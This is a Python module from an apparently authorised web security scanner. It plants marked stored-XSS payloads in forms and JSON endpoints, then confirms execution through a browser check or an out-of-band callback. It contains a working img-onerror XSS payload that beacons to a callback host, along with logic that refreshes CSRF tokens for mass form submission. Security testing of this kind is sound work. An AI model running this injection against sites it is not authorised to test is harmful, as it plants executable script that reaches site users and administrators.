"""Stored and blind XSS.

Reflected scanning answers "does this response echo my input". Stored XSS asks a
different question: "can I plant something that executes later, for someone
else". The two need different evidence:

1. **Plant** - submit a uniquely marked payload through every writable form
   (one marker per field, so a hit can be attributed to the exact field).
2. **Hunt** - re-fetch the pages discovered by the crawler and look for the
   markers. A marker in the HTML proves persistence, not execution.
3. **Prove** - open the page that carries the marker in a real browser and look
   for a node only the payload's handler could have created. If the payload is a
   script tag instead, the proof is an out-of-band callback from that browser.

The distinction matters for reporting: persistence alone is a lead, execution in
a browser is a confirmed finding, and an out-of-band hit is the only acceptable
proof for blind XSS (where the executing page is an admin view we may never see).
"""
from __future__ import annotations

import json
import time
import urllib.parse
import uuid

from .domscan import dom_target_id
from .net import Request
from .session import TOKEN_RE
from .verify import Verification

TEXTUAL_TYPES = {"", "text", "search", "textarea", "email", "url", "tel", "number"}
SKIP_TYPES = {"submit", "button", "file", "image", "reset", "password"}


def stored_payload(marker: str, callback_url: str = "") -> str:
    """One payload, two independent proofs.

    The handler creates a DOM node (visible proof when we can load the page) and,
    when a listener is running, also beacons the marker (proof when the page that
    executes it is an admin view we cannot reach). Both signals come from the
    same handler, so neither can be a false positive caused by plain reflection.
    """
    js = (f"document.body.appendChild(document.createElement('b')).id="
          f"'{dom_target_id(marker)}'")
    if callback_url:
        js += f";new Image().src='{callback_url}/hit?m={marker}'"
    return f'<img src=x onerror="{js}">'


class StoredScanner:
    """Plant payloads, find out where they reappear, then prove execution."""

    def __init__(self, http, browser=None, log=None, callback=None,
                 max_forms: int = 20, max_pages: int = 40,
                 max_verify: int = 12, screenshot_dir: str | None = None,
                 json_endpoints=None, json_field: str = "comment",
                 viewer_urls: list[str] | None = None,
                 deadline: float | None = None):
        self.http = http
        self.browser = browser
        self.log = log
        self.callback = callback
        self.max_forms = max_forms
        self.max_pages = max_pages
        self.max_verify = max_verify
        self.screenshot_dir = screenshot_dir
        self.json_endpoints = list(json_endpoints or [])
        self.json_field = json_field or "comment"
        # Operator-supplied pages that render stored content (moderation queue,
        # admin inbox, profile page). Without them a blind sink is invisible.
        self.viewer_urls = [u for u in (viewer_urls or []) if u]
        # Same --max-minutes deadline the reflective engine uses. Checked before
        # each plant and each proof so a large form set cannot overrun it.
        self.deadline = deadline
        self.budget_exhausted = False
        self.findings: list = []
        self.leads: list = []
        self.stats = {"forms": 0, "submitted": 0, "markers": 0, "hits": 0,
                      "verified": 0, "blind": 0, "json_submitted": 0,
                      "tokens_refreshed": 0}

    # -- public --------------------------------------------------------
    def _over_budget(self) -> bool:
        if self.deadline is None or time.monotonic() < self.deadline:
            return False
        self.budget_exhausted = True
        return True

    def scan(self, target: str, forms, pages) -> dict:
        usable = [f for f in forms if self._usable(f)][: self.max_forms]
        # Viewer URLs go first so the page cap can never drop them, and they are
        # the only way a payload stored behind a login becomes observable.
        page_urls = [u for u in dict.fromkeys(self.viewer_urls + list(pages or []))][: self.max_pages]
        self.stats["forms"] = len(usable)
        if not usable and not self.json_endpoints:
            return {"findings": [], "leads": [], "stats": self.stats}

        planted: list[dict] = []  # dict(form, field, marker, payload, request)
        for form in usable:
            if self._over_budget():
                if self.log:
                    self.log.warn("time budget reached during stored planting; "
                                  "remaining forms were not planted")
                break
            self._refresh_tokens(form)
            planted_entry = self._plant(form)
            if planted_entry:
                planted.extend(planted_entry)
        self.stats["submitted"] = len({id(e["form"]) for e in planted if e.get("form")})
        for url in self.json_endpoints:
            if self._over_budget():
                break
            json_entry = self._plant_json(url)
            if json_entry:
                planted.append(json_entry)
                self.stats["json_submitted"] += 1
        self.stats["markers"] = len(planted)
        if not planted:
            return {"findings": [], "leads": [], "stats": self.stats}

        hits = self._hunt(page_urls, [e["marker"] for e in planted])
        self.stats["hits"] = sum(len(v) for v in hits.values())
        verified = 0
        for entry in planted:
            if len(self.findings) >= self.max_verify:
                break
            if self._over_budget():
                if self.log:
                    self.log.warn("time budget reached during stored verification; "
                                  "later markers stay unproven")
                break
            finding = self._prove(entry, hits.get(entry["marker"], []))
            if finding is None:
                continue
            if finding.verified_browser:
                self.findings.append(finding)
                verified += 1
            else:
                self.leads.append(finding)
        self.stats["verified"] = verified
        return {"findings": self.findings, "leads": self.leads, "stats": self.stats}

    # -- planting ------------------------------------------------------
    def _usable(self, form) -> bool:
        if getattr(form, "has_file", False):
            return False
        if (form.method or "GET").upper() not in ("GET", "POST"):
            return False
        return any(self._writable(p) for p in form.params)

    @staticmethod
    def _writable(param) -> bool:
        name, _value, ptype = param
        if not name:
            return False
        ptype = (ptype or "").lower()
        return ptype not in SKIP_TYPES and ptype in TEXTUAL_TYPES

    def _refresh_tokens(self, form) -> None:
        """Re-read per-session anti-CSRF fields right before planting.

        A token that was scraped during the crawl is often stale (rotated per
        page view or per session), which makes the submission look rejected and
        hides a real stored sink.
        """
        names = [n for n, _v, _t in form.params if n and TOKEN_RE.search(n)]
        if not names or not form.origin_url:
            return
        try:
            resp = self.http.get(form.origin_url, allow_redirects=True)
        except Exception:
            return
        if not getattr(resp, "is_html", False):
            return
        from .htmlparse import parse_page

        try:
            page = parse_page(resp.url or form.origin_url, resp.text or "")
        except Exception:
            return
        candidates = [f for f in page.forms if (f.action or "") == (form.action or "")]
        if not candidates and len(page.forms) == 1:
            candidates = page.forms
        if not candidates:
            return
        fresh: dict[str, str] = {}
        for candidate in candidates:
            for name, value, _type in candidate.params:
                if name in names and value:
                    fresh.setdefault(name, value)
        if not fresh:
            return
        form.params = [(n, fresh.get(n, v), t) for n, v, t in form.params]
        self.stats["tokens_refreshed"] += len(fresh)

    def _plant_json(self, url: str) -> dict | None:
        """Plant the marker through a JSON API endpoint (fetch/XHR style sink)."""
        marker = uuid.uuid4().hex[:8]
        payload = stored_payload(marker, self.callback.url if self.callback else "")
        body = json.dumps({self.json_field: payload}).encode()
        try:
            resp = self.http.post(url, body, [("Content-Type", "application/json"),
                                             ("Accept", "application/json")],
                                  allow_redirects=True)
        except Exception as exc:
            self._log(f"stored: JSON submission to {url} failed: {str(exc)[:100]}")
            return None
        status = getattr(resp, "status", 0)
        if status >= 400:
            self._log(f"stored: POST {url} rejected the JSON payload (HTTP {status})")
            return None
        return {"form": None, "field": self.json_field, "marker": marker,
                "payload": payload, "status": status, "action": url,
                "request": f"POST {url} (application/json)"}

    def _plant(self, form) -> list[dict]:
        fields = [p for p in form.params if self._writable(p)]
        if not fields:
            return []
        markers: dict[str, str] = {}
        payloads: dict[str, str] = {}
        for name, _value, _type in fields:
            marker = uuid.uuid4().hex[:8]
            markers[name] = marker
            payloads[name] = stored_payload(
                marker, self.callback.url if self.callback else "")
        request = self._build(form, payloads)
        if request is None:
            self._log(f"stored: form on {form.origin_url or '?'} has no usable action")
            return []
        try:
            resp = self._send(request)
        except Exception as exc:
            self._log(f"stored: submission to {form.action} failed: {str(exc)[:100]}")
            return []
        status = getattr(resp, "status", 0)
        if status >= 400:
            self._log(f"stored: {form.method} {form.action} rejected the payload "
                      f"(HTTP {status})")
        out = []
        for name, _v, _t in fields:
            out.append({"form": form, "field": name, "marker": markers[name],
                        "payload": payloads[name], "status": status,
                        "action": form.action or form.origin_url or "",
                        "request": f"{(form.method or 'GET').upper()} "
                                   f"{getattr(request, 'url', '')}"})
        return out

    def _build(self, form, payloads: dict[str, str]):
        from .net import Request

        action = form.action or form.origin_url or ""
        if action and not action.lower().startswith(("http://", "https://")):
            action = urllib.parse.urljoin(form.origin_url or action, action)
        if not action.lower().startswith(("http://", "https://")):
            return None

        pairs = []
        for name, value, ptype in form.params:
            if not name:
                continue
            if (ptype or "").lower() in ("submit", "button", "file", "image", "reset"):
                continue
            pairs.append((name, payloads.get(name, value)))
        body = urllib.parse.urlencode(pairs)
        method = (form.method or "GET").upper()
        headers = [("Content-Type", "application/x-www-form-urlencoded")]
        if method == "GET":
            parts = urllib.parse.urlsplit(action)
            query = (parts.query + "&" + body) if parts.query else body
            url = urllib.parse.urlunsplit((parts.scheme, parts.netloc, parts.path,
                                           query, ""))
            return Request("GET", url, [])
        return Request("POST", action, headers, body.encode())

    def _send(self, request):
        if request.method == "GET":
            return self.http.get(request.url)
        data = request.body or b""
        headers = [h for h in request.headers if h[0].lower() != "content-length"]
        return self.http.post(request.url, data, headers, allow_redirects=True)

    # -- hunting -------------------------------------------------------
    def _hunt(self, page_urls: list[str], markers: list[str]) -> dict[str, list[str]]:
        hits: dict[str, list[str]] = {}
        for url in page_urls:
            try:
                resp = self.http.get(url)
            except Exception:
                continue
            if not getattr(resp, "is_html", True):
                continue
            body = resp.text or ""
            for marker in markers:
                if marker in body:
                    hits.setdefault(marker, []).append(resp.url or url)
        return hits

    # -- proving -------------------------------------------------------
    def _prove(self, entry: dict, sink_urls: list[str]):
        from .scanner import Finding

        marker = entry["marker"]
        target_id = dom_target_id(marker)
        proof_url = ""
        artifact = ""
        callback_hit = None
        checked = self.browser is not None and getattr(self.browser, "available", False)

        verdict = Verification.not_tested("no stored page carried the marker")
        for url in sink_urls[:2]:
            if not checked:
                verdict = Verification.not_tested("browser unavailable")
                break
            verdict, artifact, proof_url = self._browser_check(url, target_id)
            if verdict.is_confirmed:
                break
        if self.callback:
            callback_hit = self.callback.wait_for(marker, timeout=1.5)
            if callback_hit and not proof_url:
                proof_url = callback_hit.get("victim_url") or ""

        verified = bool(artifact) or bool(callback_hit)
        if not verified and not sink_urls and not callback_hit:
            return None

        lines = [
            f"Stored XSS via {entry['request']} field '{entry['field']}'",
            f"  payload: {entry['payload']}",
            f"  unique marker: {marker}",
        ]
        if sink_urls:
            lines.append(f"  marker persisted on: {', '.join(sink_urls[:3])}")
        if artifact:
            lines.append(f"  runtime proof: <{artifact}> created in the browser at {proof_url}")
        elif callback_hit:
            lines.append(f"  out-of-band proof: browser at {proof_url or 'unknown page'} "
                         f"loaded the planted script at {callback_hit.get('at')}")
        elif sink_urls:
            lines.append("  persistence only: the marker is stored but execution was "
                         "not observed")
        if entry.get("status"):
            lines.append(f"  submission HTTP status: {entry['status']}")

        notes = [f"planted through {entry['request']} field '{entry['field']}'"]
        if callback_hit:
            notes.append("payload executed in a browser that loaded the stored page "
                         f"({callback_hit.get('at')})")
        if artifact:
            notes.append("payload handler ran and created a DOM node")
        if not verified:
            if verdict.state == "not_observed":
                notes.append("marker persisted, page rendered, the handler did not run: "
                             f"{verdict.reason}")
            else:
                notes.append("marker persisted but execution was NEVER TESTED: "
                             f"{verdict.reason or 'no browser verification'}")

        if artifact and self.screenshot_dir and proof_url:
            shot = self._screenshot(marker)
            if shot:
                lines.append(f"  screenshot: {shot}")

        return Finding(
            url=proof_url or (sink_urls[0] if sink_urls else entry.get("action", "")),
            method=(entry["form"].method if entry.get("form") else "POST").upper(),
            param=entry["field"],
            location="stored", payload=entry["payload"], context="stored_xss",
            status=int(entry.get("status") or 0),
            confidence="high" if verified else "medium",
            verified_browser=verified, browser_checked=checked,
            verify_state=verdict.state if checked and sink_urls else "",
            verify_reason=verdict.reason if checked and sink_urls else "",
            evidence="\n".join(lines), notes=notes,
            title=("Stored XSS (blind, out-of-band)" if callback_hit and not artifact
                   else "Stored XSS"),
        )

    def _browser_check(self, url: str, target_id: str) -> tuple[Verification, str, str]:
        """Open the stored page and return a tri-state verdict plus the proof URL."""
        try:
            verdict = self.browser.verify_execution(Request("GET", url, []), target_id)
        except Exception as exc:
            return Verification.from_exception(exc, "stored verification"), "", url
        info = getattr(self.browser, "last_result", {}) or {}
        seen_url = info.get("url") or url
        return verdict, str(verdict.detail.get("artifact") or ""), seen_url

    def _screenshot(self, marker: str):
        import os

        if not self.screenshot_dir:
            return ""
        path = os.path.join(self.screenshot_dir, f"stored-xss-{marker}.png")
        try:
            if self.browser.screenshot(path):
                return path
        except Exception:
            pass
        return ""

    def _log(self, message: str) -> None:
        if self.log is not None:
            try:
                self.log.info(message)
            except Exception:
                pass
